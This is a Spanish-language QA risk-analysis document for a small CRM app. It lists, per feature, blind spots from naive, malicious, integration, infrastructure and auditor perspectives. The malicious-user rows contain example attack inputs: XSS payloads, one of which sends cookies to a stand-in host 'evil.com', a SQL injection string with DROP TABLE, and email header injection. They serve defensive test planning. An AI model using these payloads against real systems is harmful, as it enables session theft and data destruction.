---
workflow: quality-process
phase: planeacion
version: 1.0.0
methodology: BMAD V6.0 MegaPrompt
generated_date: 2026-03-25T12:00:00Z
project_name: Siesa-Agents
input_documents:
  epics:
    - _bmad-output/planning-artifacts/epics/epic-01-foundation.md
    - _bmad-output/planning-artifacts/epics/epic-02-gestion-de-clientes.md
    - _bmad-output/planning-artifacts/epics/epic-03-gestion-de-contactos.md
    - _bmad-output/planning-artifacts/epics/epic-04-asociacion-cliente-contacto.md
  prd:
    - _bmad-output/planning-artifacts/prd/executive-summary.md
    - _bmad-output/planning-artifacts/prd/functional-requirements.md
technology_stack: _bmad/bmm/workflows/3-solutioning/create-architecture/data/company-standards/technology-stack.md
---

# Fase 3 — Puntos Ciegos Detectados por Feature

## III. PUNTOS CIEGOS DETECTADOS POR FEATURE

### Arquetipos Universales Analizados

| Arquetipo | Descripción |
| :--- | :--- |
| 🙈 **Usuario Inexperto (Naive User)** | Comete errores de uso inesperados: doble clic, campos de espacios, URLs malformadas |
| 😈 **Usuario Malintencionado** | Intenta XSS, SQL injection, IDOR, manipulación de payloads |
| 🔌 **Perfil de Integración (APIs)** | Analiza comportamiento de llamadas HTTP, contratos de API, race conditions, caché |
| 🔥 **Entorno Hostil (Infraestructura)** | Red lenta/caída, pérdida de conexión durante operaciones, service worker desactualizado |
| 📊 **Usuario de Consulta/Reportería** | Consultas masivas, filtros, exportación de datos, performance con datasets grandes |
| 🔍 **Auditor de Procesos** | Trazabilidad, historial, compliance, integridad referencial |

---

## Feature F1 — Navegación y Shell de Aplicación

**Historias:** E1-S1.2 | **FRs:** FR28, FR29, FR30

| Arquetipo | Riesgo Detectado | Consecuencia para el Negocio |
| :--- | :--- | :--- |
| 🙈 Usuario Inexperto | El usuario hace clic muy rápido entre "Clientes" y "Contactos" antes de que la vista anterior cargue (rapid clicks). TanStack Router puede manejar múltiples navegaciones pendientes y terminar en un estado de UI inconsistente donde la URL no coincide con la vista renderizada. | Los usuarios perciben la app como "buggy" o lenta. Reducción de confianza en el sistema. |
| 😈 Usuario Malintencionado | Inyección de payload XSS en query params de la URL: `localhost:5173/clientes?q=<img src=x onerror=alert(1)>`. Si el valor del parámetro se usa para renderizar contenido sin sanitizar (ej: en un breadcrumb o campo de búsqueda pre-cargado), se ejecuta código malicioso. | Compromiso de sesión de usuario, robo de datos, defacement de la interfaz. Riesgo de reputación para la empresa. |
| 🔌 Perfil de Integración | El botón "Atrás" del navegador en modo SPA con TanStack Router puede comportarse diferente a navegación nativa. Especialmente al usar modales: el usuario abre un modal, presiona "atrás", espera volver a la pantalla anterior pero el modal desaparece sin navegar. El history stack de React/Router puede desincronizarse con el history del navegador. | Confusión del usuario y pérdida de contexto. El usuario puede creer que perdió datos no guardados. |
| 🔥 Entorno Hostil | Si hay un service worker activo (vite-plugin-pwa), tras un deployment nuevo el worker puede servir el bundle JavaScript desactualizado. El usuario ve la app anterior en cache mientras el backend espera el nuevo contrato de API. Esto puede generar errores 404 o mismatches en endpoints. | Los usuarios continúan usando una versión obsoleta de la app silenciosamente. Los errores de compatibilidad son difíciles de diagnosticar remotamente. |
| 📱 **Arquetipo adicional: Usuario Móvil iOS Safari** | El gesto de deslizar desde el borde izquierdo de la pantalla en iOS Safari activa el "back navigation" del navegador nativo, independientemente de TanStack Router. Esto puede causar que el usuario salga inesperadamente de la SPA al historial del navegador (página en blanco, prev URL). | Sesiones interrumpidas en móvil — especialmente crítico para equipo comercial que usa la app desde el teléfono. |
| 🔍 Auditor de Procesos | La aplicación no tiene mecanismo de logging de navegación del usuario ni breadcrumbs de sesión. No existe trazabilidad de qué vistas visitó el usuario antes de un error. | Dificultad para diagnosticar problemas reportados por usuarios. Sin evidencia de comportamiento para soporte técnico. |

---

## Feature F2 — Gestión de Clientes

**Historias:** E2-S2.1, E2-S2.2, E2-S2.3, E2-S2.4, E2-S2.5 | **FRs:** FR1–FR8, FR27

| Arquetipo | Riesgo Detectado | Consecuencia para el Negocio |
| :--- | :--- | :--- |
| 🙈 Usuario Inexperto | El usuario llena los campos de formulario con solo espacios en blanco (ej: Nombre = "   "). La validación con `zod.string().min(1)` falla si no incluye `.trim()`. El string `"   "` tiene `length > 0` y puede pasar la validación frontend y llegar al backend como un nombre de cliente inválido pero técnicamente no vacío. | Se crean clientes con datos vacíos visualmente (nombre y campos parecen en blanco en la lista). Calidad de datos comprometida. |
| 🙈 Usuario Inexperto | El usuario hace doble clic en el botón "Guardar" del formulario antes de recibir la respuesta del backend. Si no hay protección de debounce o deshabilitado del botón post-primer-submit, se envían 2 requests POST simultáneos y se crean 2 clientes idénticos. | Registros duplicados en la base de datos. Confusión operativa y limpieza manual de datos. |
| 😈 Usuario Malintencionado | Inyección XSS en el campo Nombre: `<script>document.cookie='stolen='+document.cookie</script>` o `<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>`. Si el Nombre se renderiza como innerHTML en lugar de textContent en alguna vista, el script se ejecuta. | Compromiso de todas las sesiones de usuarios que vean ese cliente en su lista. Potencial robo de información. |
| 😈 Usuario Malintencionado | Inyección SQL en el campo NIT/RUC: `900123456'; DROP TABLE clientes; --`. Aunque EF Core con parámetros previene esto, si hay algún endpoint con DynamicLinq o query string que concatene directamente el NIT/RUC sin escapar, la tabla puede ser comprometida. | Pérdida total de datos de clientes. Impacto regulatorio y de continuidad del negocio. |
| 🔌 Perfil de Integración | El backend puede retornar HTTP 409 para NIT/RUC duplicado, pero el frontend debe mapear correctamente este código a un mensaje de usuario. Si el frontend solo captura errores 4xx genéricos con un mensaje "Error al guardar", el usuario no sabe que el NIT/RUC ya existe y repite el mismo error. El contrato de error debe especificar el campo `title` o `detail` en Problem Details RFC 7807. | Frustración del usuario. Llamadas de soporte innecesarias. Incapacidad para auto-resolver el problema. |
| 🔌 Perfil de Integración | La invalidación de caché `['clientes']` de TanStack Query tras crear/editar/eliminar puede no cubrir las queries con parámetros (ej: `['clientes', { search: 'Acme' }]`). Si el usuario tenía una búsqueda activa cuando realiza una operación CRUD, la lista filtrada puede no actualizarse inmediatamente. | El usuario cree que su cambio no fue guardado. Puede intentar repetir la operación y crear duplicados. |
| 🔥 Entorno Hostil | Pérdida de red durante el submit del formulario de creación: el request HTTP llega al backend y el cliente es creado (HTTP 201), pero el frontend nunca recibe la respuesta y muestra un error de red. En el siguiente intento del usuario, si el NIT/RUC ya existe, recibe 409 — pero si no hay NIT/RUC duplicado, se crea un segundo cliente idéntico. | Duplicación de registros sin que el usuario lo sepa. Limpieza manual de datos requerida. |
| 🔍 Auditor de Procesos | Al eliminar un cliente con contactos asociados, los contactos quedan como huérfanos (`clienteId = null`) pero **no existe ningún registro de auditoría** que indique a qué cliente pertenecían anteriormente. Si el equipo necesita reconstituir la asociación original, no hay cómo hacerlo. | Pérdida de trazabilidad de relaciones cliente-contacto. Riesgo de compliance en sectores regulados. Imposibilidad de auditar quién cambió qué y cuándo. |
| 📊 Usuario de Consulta | Búsqueda con caracteres wildcard que son especiales en SQL: `%`, `_`, `\`. Si el backend usa `LIKE '%{query}%'` sin escapar estos caracteres, una búsqueda con `%` retorna todos los registros, y `_` retorna registros con cualquier carácter en esa posición. | Resultados de búsqueda incorrectos o excesivos. Posible degradación de performance en búsquedas con `%` en datasets grandes. |
| 📊 **Arquetipo adicional: Operador de Datos Masivos** | La búsqueda en tiempo real con 500 clientes funciona en < 1s (NFR1), pero si el sistema crece a 2,000+ clientes (NFR11 — no hay límites hard-coded), el filtrado client-side puede degradarse significativamente. La arquitectura debe prever cuándo migrar a búsqueda server-side. | Performance inaceptable en búsqueda. Los usuarios no pueden encontrar clientes rápidamente, afectando productividad comercial. |

---

## Feature F3 — Gestión de Contactos

**Historias:** E3-S3.1, E3-S3.2, E3-S3.3, E3-S3.4, E3-S3.5 | **FRs:** FR9–FR16, FR27

| Arquetipo | Riesgo Detectado | Consecuencia para el Negocio |
| :--- | :--- | :--- |
| 🙈 Usuario Inexperto | El usuario ingresa un email con formato inválido (ej: "juan.empresa.com", "juan@", "@empresa.com") y el sistema lo acepta si la validación de email es demasiado permisiva (solo verifica que contenga "@"). Los emails inválidos no pueden usarse para comunicaciones. | Datos de contacto inutilizables. Comunicaciones fallidas. Pérdida de oportunidades de negocio. |
| 🙈 Usuario Inexperto | El usuario intenta buscar un contacto por nombre parcial usando mayúsculas cuando el registro está en minúsculas (ej: busca "JUAN" pero el nombre es "Juan Pérez"). Si el filtro es case-sensitive, no retorna resultados. | El usuario cree que el contacto no existe y puede crear un duplicado. |
| 😈 Usuario Malintencionado | Payload XSS en el campo Email: `"><script>alert(document.domain)</script>@evil.com`. Si el email se renderiza en algún contexto HTML sin sanitización (tooltips, modales de confirmación), el script puede ejecutarse. | Robo de sesión, comprometimiento de la seguridad del usuario. |
| 😈 Usuario Malintencionado | Header injection en el campo Email si el sistema alguna vez usa el email para enviar notificaciones: `victim@example.com%0ACc: attacker@example.com`. Aunque en la fase actual del MVP no se envían emails, si el campo se usa en el futuro sin validación correcta, se convierte en vector de ataque. | Riesgo futuro de email spoofing/spam. Importancia de validar formato de email correctamente desde el inicio. |
| 🔌 Perfil de Integración | El sistema no documenta explícitamente si el Email debe ser único entre contactos. Si dos contactos tienen el mismo email y el backend no tiene restricción unique, pero el equipo de negocio asume que sí lo es, se generarán conflictos en campañas de email o al identificar contactos. La historia E3-S3.3 no especifica unicidad de email. | Duplicación silenciosa de contactos por mismo email. Comunicaciones de negocio inconsistentes. |
| 🔥 Entorno Hostil | Con 1,000 contactos (NFR10), si el frontend renderiza la lista completa sin virtualización (windowing), el DOM tendrá 1,000 nodos. En dispositivos móviles de gama baja, esto puede causar lag de 3-5s al scrollear, afectando la experiencia de búsqueda. | App percibida como lenta en móvil. El equipo comercial (que usa la app desde teléfono) abandona el uso de la app. |
| 🔥 Entorno Hostil | Si el usuario está editando un contacto y pierde conexión antes de guardar, al intentar guardar recibe un error de red genérico. No hay mecanismo de "guardar borrador" o recuperación automática del formulario. | Pérdida de datos ingresados. El usuario debe reingresar toda la información desde cero. Frustración alta en formularios largos. |
| 📊 Usuario de Consulta | El filtro de búsqueda en tiempo real opera sobre la lista ya cargada en memoria. Si el usuario navega a otra sección y regresa a Contactos, la query de TanStack Query puede refrescar la lista (dependiendo del `staleTime`), perdiendo el texto de búsqueda que el usuario había ingresado. | Interrupción del flujo de trabajo. El usuario pierde su contexto de búsqueda. |
| 🔍 Auditor de Procesos | Al igual que con clientes, no hay historial de modificaciones en los contactos. No se puede saber quién creó un contacto, quién lo modificó por última vez, ni cuándo. En entornos con múltiples usuarios, esto impide auditorías de cambios. | Sin trazabilidad de cambios. Imposibilidad de identificar origen de datos incorrectos. |

---

## Feature F4 — Asociación Cliente-Contacto & Calidad de Datos

**Historias:** E4-S4.1, E4-S4.2, E4-S4.3, E4-S4.4, E4-S4.5, E4-S4.6 | **FRs:** FR17–FR27

| Arquetipo | Riesgo Detectado | Consecuencia para el Negocio |
| :--- | :--- | :--- |
| 🙈 Usuario Inexperto | El usuario intenta asociar el mismo contacto a un cliente donde ya está asociado (doble asociación). Si el `PUT /api/v1/contactos/{id}/cliente` es idempotente, no hay problema. Pero si no lo es, puede retornar un error 400/409 que el usuario no entiende. | Confusión del usuario. Posible duplicación si el backend no garantiza idempotencia. |
| 🙈 Usuario Inexperto | En la pantalla de reasignación, el usuario selecciona el MISMO cliente actual como destino de reasignación. Si el sistema no valida esto, llama al API con el mismo clienteId, generando una operación innecesaria e invalidación de caché sin cambio real. | Degradación de performance innecesaria. Confusión si la UI no da feedback de "no hubo cambios". |
| 😈 Usuario Malintencionado | **IDOR (Insecure Direct Object Reference):** Dado que el MVP no tiene autenticación, cualquier usuario puede llamar directamente a `PUT /api/v1/contactos/{id}/cliente` con cualquier `contactoId` y cualquier `clienteId` vía HTTP. Sin validación de pertenencia/propiedad, cualquier persona con acceso de red puede reasignar contactos arbitrariamente. | Manipulación maliciosa de asociaciones de datos. Impacto directo en la integridad del CRM. Riesgo crítico si la app se despliega en un entorno de red no controlado. |
| 🔌 Perfil de Integración | **Race condition:** Dos usuarios abren la misma pantalla al mismo tiempo y ambos intentan asociar el mismo contacto huérfano a diferentes clientes. El backend procesa ambas requests y la última en llegar "gana" (`clienteId` del segundo request). El primer usuario no recibe notificación de que su acción fue sobreescrita. | Asociación incorrecta silenciosa. El contacto queda asignado al cliente equivocado sin que el primer usuario lo sepa. |
| 🔌 Perfil de Integración | La invalidación de queryKeys tras reasignación debe cubrir 3 keys: `['contactos']`, `['contactos', { clienteId: oldId }]` y `['contactos', { clienteId: newId }]`. Si falta alguna, el ContactManager del cliente anterior o nuevo puede mostrar datos desactualizados. | Los usuarios ven listas de contactos que no reflejan el estado real del sistema. Errores de integridad visual. |
| 🔥 Entorno Hostil | Network timeout durante el `PUT /api/v1/contactos/{id}/cliente`: si la solicitud de asociación pierde la conexión antes de recibir respuesta, el estado del frontend puede quedar desincronizado con el backend. El frontend puede mostrar el contacto como "no asociado" cuando ya fue asociado en el backend. | Estado inconsistente entre UI y base de datos. El usuario puede intentar repetir la operación y recibir un comportamiento inesperado. |
| 🔥 Entorno Hostil | Al navegar desde el detalle de cliente hacia el detalle de un contacto (vía ContactManager), si el contacto fue eliminado por otro usuario en otra sesión mientras tanto, el intento de navegación a `/contactos/:contactoId` retornará un not-found. La UI debe manejar este caso gracefully. | Blank screen o error 404 no manejado. El usuario queda en un estado de navegación bloqueado. |
| 📊 Usuario de Consulta | El ContactManager muestra todos los contactos de un cliente en un solo bloque. Si un cliente tiene 100+ contactos asociados (edge en empresa grande), el componente puede saturarse sin paginación ni virtualización, especialmente en móvil. El spec solo habla de 1,000 contactos totales pero no limita cuántos puede tener un solo cliente. | Degradación de performance al abrir el detalle de clientes con muchos contactos. Potencial hang o crash en dispositivos de gama baja. |
| 🔍 Auditor de Procesos | No existe historial de reasignaciones de contactos. No se puede saber: "Este contacto estuvo asociado al Cliente A durante 2 años y fue reasignado al Cliente B el 15 de marzo". En auditorías de cuenta o disputas de cartera comercial, esta trazabilidad es crítica. | Sin evidencia de quién gestionó la cuenta. Imposibilidad de auditar el ciclo de vida de la relación cliente-contacto en entornos regulados. |
| 🔍 Auditor de Procesos | El filtro "Sin cliente" muestra contactos huérfanos, pero no indica POR QUÉ están huérfanos (su cliente fue eliminado, fueron creados sin cliente, fueron desasociados voluntariamente). Sin esta contexto, el operador de datos no puede priorizar cuáles reasignar primero. | Gestión de datos ineficiente. Los contactos huérfanos más críticos (ej: de clientes eliminados) no reciben atención prioritaria. |
| 📱 **Arquetipo adicional: Usuario de Gestión de Datos Masiva** | El selector de clientes en la pantalla de reasignación carga TODOS los clientes disponibles sin paginación. Si el sistema tiene 500 clientes (NFR10 máximo para MVP), el dropdown puede ser inmanejable y la búsqueda dentro de él puede ser lenta o inexistente. | El operador no puede reasignar contactos eficientemente con muchos clientes. Abandono del flujo de reasignación. |
| 🔥 **Arquetipo adicional: Operación Concurrente Multi-usuario** | Si el Usuario A está viendo el ContactManager de un cliente y el Usuario B elimina ese cliente en otra sesión, el Usuario A puede quedar en la vista de un cliente que ya no existe, con un ContactManager que falla al intentar cargar o realizar operaciones. | Inconsistencia de datos en tiempo real. UI bloqueada o con errores no manejados. |
